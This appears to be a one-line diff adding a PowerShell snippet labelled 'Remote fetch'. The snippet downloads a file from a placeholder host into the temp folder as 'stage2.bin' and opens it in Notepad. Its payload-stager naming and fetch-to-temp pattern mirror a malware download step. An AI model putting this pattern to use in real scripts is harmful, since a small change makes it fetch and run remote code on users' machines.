@@ -1,0 +1,1 @@
+<# Remote fetch #> $DownloadUrl = 'http://example.net/update.dat'; $PayloadPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $PayloadPath); Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
